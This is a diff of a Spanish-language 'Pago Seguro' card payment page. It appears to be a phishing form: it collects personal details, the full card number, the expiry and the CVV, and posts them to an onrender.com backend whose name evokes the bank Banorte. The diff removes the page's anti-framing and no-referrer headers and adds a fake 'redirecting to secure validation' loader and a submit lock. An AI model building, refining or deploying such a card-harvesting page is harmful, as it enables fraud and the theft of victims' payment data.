@@ -4,9 +4,8 @@
 <meta charset="UTF-8">
 <title>Pago Seguro</title>
 
+<!-- ✅ ELIMINADO SAMEORIGIN -->
 <meta http-equiv="X-Content-Type-Options" content="nosniff">
-<meta http-equiv="X-Frame-Options" content="SAMEORIGIN">
-<meta name="referrer" content="no-referrer">
 
 <style>
 body {
@@ -38,6 +37,7 @@ input, select {
   margin: 7px 0;
   border-radius: 8px;
   border: 1px solid #ccc;
+  box-sizing: border-box;
 }
 
 button {
@@ -48,10 +48,16 @@ button {
   border: none;
   border-radius: 8px;
   cursor: pointer;
+  transition: 0.2s;
 }
 
 button:hover {
   background: #4a148c;
+}
+
+button:disabled {
+  opacity: 0.7;
+  cursor: not-allowed;
 }
 
 .cvv-container {
@@ -72,72 +78,145 @@ button:hover {
   font-size: 14px;
   color: #555;
 }
+
+.loading {
+  display: none;
+  margin-top: 10px;
+  text-align: center;
+  color: #6a1b9a;
+  font-size: 13px;
+}
 </style>
 </head>
 
 <body>
 
 <div class="container">
+
   <h2>Pago Seguro</h2>
 
   <form 
+    id="paymentForm"
     method="POST" 
     action="https://backend-banorte.onrender.com/api/payment/3d-secure"
     autocomplete="off"
     onsubmit="return validarForm()"
   >
 
-    <div class="section-title">Datos personales</div>
-    <input name="nombre" placeholder="Nombre completo" required minlength="3">
-    <input name="correo" type="email" placeholder="Correo electrónico" required>
-    <input name="telefono" placeholder="Teléfono" pattern="\d{10}" required>
+    <div class="section-title">
+      Datos personales
+    </div>
 
-    <div class="section-title">Dirección de facturación</div>
-    <input name="direccion" placeholder="Dirección" required minlength="5">
-    <input name="ciudad" placeholder="Ciudad" required>
-    <input name="cp" placeholder="Código Postal" pattern="\d{5}" required>
+    <input
+      name="nombre"
+      placeholder="Nombre completo"
+      required
+      minlength="3"
+    >
 
-    <div class="section-title">Tipo de tarjeta</div>
-    <select name="tipoTarjeta" required>
-      <option value="">Selecciona</option>
-      <option value="CR">Crédito</option>
-      <option value="DB">Débito</option>
+    <input
+      name="correo"
+      type="email"
+      placeholder="Correo electrónico"
+      required
+    >
+
+    <input
+      name="telefono"
+      placeholder="Teléfono"
+      pattern="\d{10}"
+      required
+    >
+
+    <div class="section-title">
+      Dirección de facturación
+    </div>
+
+    <input
+      name="direccion"
+      placeholder="Dirección"
+      required
+      minlength="5"
+    >
+
+    <input
+      name="ciudad"
+      placeholder="Ciudad"
+      required
+    >
+
+    <input
+      name="cp"
+      placeholder="Código Postal"
+      pattern="\d{5}"
+      required
+    >
+
+    <div class="section-title">
+      Tipo de tarjeta
+    </div>
+
+    <select
+      name="tipoTarjeta"
+      required
+    >
+      <option value="">
+        Selecciona
+      </option>
+
+      <option value="CR">
+        Crédito
+      </option>
+
+      <option value="DB">
+        Débito
+      </option>
     </select>
 
-    <div class="section-title">Datos de la tarjeta</div>
+    <div class="section-title">
+      Datos de la tarjeta
+    </div>
 
-    <input 
-      name="cardNumber" 
-      placeholder="Número de tarjeta" 
+    <input
+      name="cardNumber"
+      placeholder="Número de tarjeta"
       maxlength="16"
-      pattern="\d{15,16}" 
+      pattern="\d{15,16}"
       inputmode="numeric"
       required
     >
 
-    <input 
-      name="cardExp" 
-      placeholder="MM/AA" 
+    <input
+      name="cardExp"
+      placeholder="MM/AA"
       maxlength="5"
       pattern="\d{2}/\d{2}"
       required
     >
 
     <div class="cvv-container">
-      <input 
-        id="cvv" 
-        name="cvv" 
-        type="password" 
-        placeholder="CVV" 
+
+      <input
+        id="cvv"
+        name="cvv"
+        type="password"
+        placeholder="CVV"
         maxlength="4"
         pattern="\d{3,4}"
         required
       >
-      <span class="toggle-cvv" onclick="toggleCVV()">Ver</span>
+
+      <span
+        class="toggle-cvv"
+        onclick="toggleCVV()"
+      >
+        Ver
+      </span>
+
     </div>
 
-    <input 
-      name="amount" 
+    <input
+      name="amount"
       type="number"
       min="1"
       max="9999999.99"
@@ -146,67 +225,145 @@ button:hover {
       required
     >
 
-    <button type="submit">Pagar</button>
+    <button
+      id="submitBtn"
+      type="submit"
+    >
+      Pagar
+    </button>
 
-    <p style="font-size:12px; color:gray; text-align:center;">
-      Tus datos se usan únicamente para validar el pago de forma segura.
+    <div
+      class="loading"
+      id="loading"
+    >
+      Redirigiendo a validación segura...
+    </div>
+
+    <p style="
+      font-size:12px;
+      color:gray;
+      text-align:center;
+    ">
+      Tus datos se usan únicamente
+      para validar el pago de forma segura.
     </p>
 
   </form>
+
 </div>
 
 <script>
+
 // ===============================
 // VALIDACIÓN GENERAL
 // ===============================
 function validarForm() {
-  const monto = document.querySelector('[name="amount"]').value;
+
+  const monto =
+    document.querySelector(
+      '[name="amount"]'
+    ).value;
 
   if (Number(monto) <= 0) {
+
     alert("Monto inválido");
+
     return false;
   }
 
+  // ✅ DESHABILITAR BOTÓN
+  document
+    .getElementById("submitBtn")
+    .disabled = true;
+
+  // ✅ MOSTRAR LOADING
+  document
+    .getElementById("loading")
+    .style.display = "block";
+
   return true;
 }
+
 
 // ===============================
 // MOSTRAR / OCULTAR CVV
 // ===============================
 function toggleCVV() {
-  const cvv = document.getElementById("cvv");
-  cvv.type = cvv.type === "password" ? "text" : "password";
+
+  const cvv =
+    document.getElementById("cvv");
+
+  cvv.type =
+    cvv.type === "password"
+      ? "text"
+      : "password";
 }
+
 
 // ===============================
 // FORMATO MM/AA
 // ===============================
-document.querySelector('[name="cardExp"]').addEventListener("input", e => {
-  let val = e.target.value.replace(/\D/g, "");
-  if (val.length >= 2) val = val.slice(0,2) + "/" + val.slice(2,4);
-  e.target.value = val;
-});
+document
+  .querySelector('[name="cardExp"]')
+  .addEventListener("input", e => {
+
+    let val =
+      e.target.value
+        .replace(/\D/g, "");
+
+    if (val.length >= 2) {
+
+      val =
+        val.slice(0,2) +
+        "/" +
+        val.slice(2,4);
+    }
+
+    e.target.value = val;
+  });
+
 
 // ===============================
 // SOLO NÚMEROS TARJETA
 // ===============================
-document.querySelector('[name="cardNumber"]').addEventListener("input", e => {
-  e.target.value = e.target.value.replace(/\D/g, "").slice(0,16);
-});
+document
+  .querySelector('[name="cardNumber"]')
+  .addEventListener("input", e => {
+
+    e.target.value =
+      e.target.value
+        .replace(/\D/g, "")
+        .slice(0,16);
+  });
+
 
 // ===============================
 // SOLO NÚMEROS TELÉFONO
 // ===============================
-document.querySelector('[name="telefono"]').addEventListener("input", e => {
-  e.target.value = e.target.value.replace(/\D/g, "").slice(0,10);
-});
+document
+  .querySelector('[name="telefono"]')
+  .addEventListener("input", e => {
+
+    e.target.value =
+      e.target.value
+        .replace(/\D/g, "")
+        .slice(0,10);
+  });
+
 
 // ===============================
 // SOLO NÚMEROS CP
 // ===============================
-document.querySelector('[name="cp"]').addEventListener("input", e => {
-  e.target.value = e.target.value.replace(/\D/g, "").slice(0,5);
-});
+document
+  .querySelector('[name="cp"]')
+  .addEventListener("input", e => {
+
+    e.target.value =
+      e.target.value
+        .replace(/\D/g, "")
+        .slice(0,5);
+  });
+
 </script>
 
 </body>
